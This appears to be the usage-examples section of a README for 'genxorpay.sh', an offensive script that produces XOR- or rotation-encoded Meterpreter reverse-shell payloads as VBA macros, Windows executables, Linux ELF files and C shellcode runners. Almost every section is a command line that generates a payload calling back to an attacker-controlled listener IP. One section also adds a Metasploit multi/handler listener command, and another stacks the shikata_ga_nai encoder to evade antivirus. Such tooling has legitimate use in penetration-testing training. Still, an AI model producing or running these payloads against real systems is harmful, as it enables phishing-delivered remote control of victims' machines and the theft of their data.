# Exmaples
The following are some example use cases of the script, there are many more ways to use this


### 1️⃣ Generate VBA Macro for Reverse HTTPS Meterpreter

```bash
./genxorpay.sh -p 1 -lhost 10.10.14.22 -lport 443 -o payload.vba -raw raw_shellcode.vba
```
- Creates XOR-encoded VBA macro in `payload.vba`
- Stores raw shellcode in `raw_shellcode.vba`
- Listener: `msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; ..."`

---
### 2️⃣ Generate Payload and Enter Interactive Mode

```bash
./genxorpay.sh -p 4 -lhost 192.168.1.7 -lport 4444 -o macro.vba -i
```

- After generation, lets you **copy**:
    - VBA macro
    - Raw shellcode
    - XOR-encoded buffer
    - Listener command
    - Or **all at once** to clipboard

---

### 3️⃣ Generate `.exe` for Python Meterpreter Shell

```bash
./genxorpay.sh -p 16 -lhost 192.168.1.5 -lport 5555
```

- Creates binary output: `python_meterpreter_reverse_tcp.exe`
- Skips VBA since it's unsupported for non-shellcode formats

---

### 4️⃣ Use Custom XOR Key

```bash
./genxorpay.sh -p 6 -lhost 10.0.0.10 -lport 1337 -key 0x2A -o evil_macro.vba
```

- Uses custom XOR key `0x2A`
- Output: `evil_macro.vba`

### 5️⃣ Generate Linux ELF Meterpreter Payload (x64)

```bash
./genxorpay.sh -lhost 192.168.45.237 -lport 443 -p 12 -key 0x41 -o met64.elf -i --arch x64 --format elf --platform linux
```

----

### 6️⃣ Linux Shellcode with XOR-Encoded C Output

```bash
./genxorpay.sh -lhost 192.168.45.237 -lport 443 -p 13 -key 0x41 -o xor.c -i --arch x64 --format c --platform linux
```

- Generates XOR-encoded shellcode buffer for C payload
- Output C file: `xor.c`
- Includes decoder and shellcode runner

---

### 7️⃣ Linux Shellcode with Bit Rotation Encoding (C Output)

```bash
./genxorpay.sh -lhost 192.168.45.237 -lport 443 -p 13 -o rotate.c -i --arch x64 --format c --platform linux --rotate 2
```

- Applies bit-rotation (left by 2 bits) instead of XOR
- Automatically decodes in the generated C file
- Output C file: `rotate.c`

---

### 8️⃣ VBA Payload with Shikata Encoder (x86)

```bash
./genxorpay.sh -lhost 192.168.45.237 -lport 443 -p 4 -key 0x41 -o shigata.vba -i --arch x86 -e 1
```

- Uses `x86/shikata_ga_nai` encoder (index 1)
- Also applies XOR
- Output VBA macro: `shigata.vba`

---

### 9️⃣ Pure XOR VBA Shellcode (x86)

```bash
./genxorpay.sh -lhost 192.168.45.237 -lport 443 -p 4 -key 0x41 -o normalrev.vba -i --arch x86
```

- Only XOR applied (no encoder)
- Output VBA file: `normalrev.vba`
